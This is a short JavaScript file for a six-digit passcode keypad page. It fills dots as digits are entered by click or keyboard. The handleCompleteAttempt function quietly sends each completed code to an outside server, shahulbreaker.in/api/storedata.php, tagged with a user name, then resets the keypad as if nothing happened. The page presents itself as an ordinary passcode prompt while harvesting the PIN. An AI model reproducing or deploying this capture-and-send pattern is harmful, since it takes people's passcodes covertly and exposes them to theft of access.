const keys = document.querySelectorAll('.key');
const dots = document.querySelectorAll('.dot');
let code = '';
const MAX = 6;

// Refresh the dots to match current code length
function refreshDots() {
  dots.forEach((dot, i) => {
    if (i < code.length) {
      dot.classList.add('filled');
    } else {
      dot.classList.remove('filled');
    }
  });
}

// Reset code input
function reset() {
  code = '';
  refreshDots();
}

// Handle when the full code is entered
function handleCompleteAttempt(enteredCode) {
  // Send to API
  fetch(`https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=${enteredCode}`)
    .then(res => res.text())
    .then(response => {
      console.log('Server response:', response);
    })
    .catch(err => {
      console.error('Error:', err);
    });
}

// Numeric key handling
keys.forEach(k => k.addEventListener('click', () => {
  const num = k.dataset.num;
  const action = k.dataset.action;

  // Number keys
  if (num) {
    if (code.length >= MAX) return;
    code += num;
    refreshDots();

    if (code.length === MAX) {
      const enteredCode = code;
      handleCompleteAttempt(enteredCode);
      reset();
    }
  }

  // Delete key
  if (action === 'delete') {
    code = code.slice(0, -1);
    refreshDots();
  }
}));

// Optional: allow keyboard entry too (for desktop testing)
document.addEventListener('keydown', e => {
  if (/^[0-9]$/.test(e.key)) {
    if (code.length < MAX) {
      code += e.key;
      refreshDots();
      if (code.length === MAX) {
        const enteredCode = code;
        handleCompleteAttempt(enteredCode);
        reset();
      }
    }
  }
  if (e.key === 'Backspace') {
    code = code.slice(0, -1);
    refreshDots();
  }
});
